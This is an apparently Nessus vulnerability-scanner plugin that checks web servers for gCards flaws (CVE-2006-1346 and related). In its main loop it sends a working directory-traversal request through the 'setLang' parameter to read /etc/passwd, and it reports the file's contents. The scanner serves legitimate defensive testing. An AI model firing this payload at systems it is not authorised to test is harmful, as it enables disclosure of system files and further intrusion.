#
# (C) Josh Zlatin-Amishav (josh at ramat dot cc)
# GPLv2
#


desc["english"] = "
Synopsis :

The remote web server contains a PHP application that is prone to
multiple vulnerabilities. 

Description :

The remote host is running gCards, a free electronic greeting card
system written in PHP. 

The installed version of gCards fails to sanitize user input to the
'setLang' parameter in the 'inc/setLang.php' script which is called by
'index.php'.  An unauthenticated attacker may be able to exploit this
issue to read arbitrary local files or execute code from local files
subject to the permissions of the web server user id. 

There are also reportedly other flaws in the installed application,
including a directory traversal issue that allows reading of local
files as well as a SQL injection and a cross-site scripting issue. 

See also :

http://retrogod.altervista.org/gcards_145_xpl.html
http://www.nessus.org/u?5e89025e

Solution :

Upgrade to gCards version 1.46 or later. 

Risk factor :

Medium / CVSS Base Score : 6.9
(AV:R/AC:L/Au:NR/C:P/I:P/A:P/B:N)";

if (description) {
script_id(21168);
script_version("$Revision: 1.2 $");

script_cve_id("CVE-2006-1346", "CVE-2006-1347", "CVE-2006-1348");
script_bugtraq_id(17165);
if (defined_func("script_xref")) script_xref(name:"OSVDB", value:"24016");

name["english"] = "gCards Multiple Vulnerabilities";
script_name(english:name["english"]);

script_description(english:desc["english"]);

summary["english"] = "Checks for directory transversal in gCards index.php script";
script_summary(english:summary["english"]);

script_category(ACT_ATTACK);
script_family(english:"CGI abuses");

script_copyright(english:"This script is Copyright (C) 2006 Josh Zlatin-Amishav");

script_dependencie("http_version.nasl");
script_require_ports("Services/www", 80);
script_exclude_keys("Settings/disable_cgi_scanning");

exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


if (thorough_tests) dirs = make_list("/gcards", cgi_dirs());
else dirs = make_list(cgi_dirs());

# Loop through CGI directories.
foreach dir (dirs) {
  # Try to exploit the flaw in setLang.php to read /etc/passwd.
  lang = SCRIPT_NAME;
  req = http_get(
    item:string(
    dir, "/index.php?",
    "setLang=", lang, "&",
    "lang[", lang, "][file]=../../../../../../../../../../../../etc/passwd"
    ),
    port:port
  );
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # There's a problem if...
  if (
    egrep(pattern:">gCards</a> v.*Graphics by Greg gCards", string:res) &&
    (
      # there's an entry for root or ...
      egrep(pattern:"root:.*:0:[01]:", string:res) ||
      # we get an error claiming the file doesn't exist or...
      egrep(pattern:"main\(inc/lang/.+/etc/passwd\).+ failed to open stream: No such file or directory", string:res) ||
      # we get an error about open_basedir restriction
      egrep(pattern:"main.+ open_basedir restriction in effect\. File\(\./inc/lang/.+/etc/passwd", string:res)
    )
  ) {
    if (egrep(pattern:"root:.*:0:[01]:", string:res))
      content = res - strstr(res, '<!DOCTYPE HTML PUBLIC');

    if (content)
      report = string(
        desc["english"],
        "\n\n",
        "Plugin output :\n",
        "\n",
        "Here are the contents of the file '/etc/passwd' that\n",
        "Nessus was able to read from the remote host :\n",
        "\n",
        content
      );
    else report = desc["english"];

    security_warning(port:port, data:report);
    exit(0);
  }
}
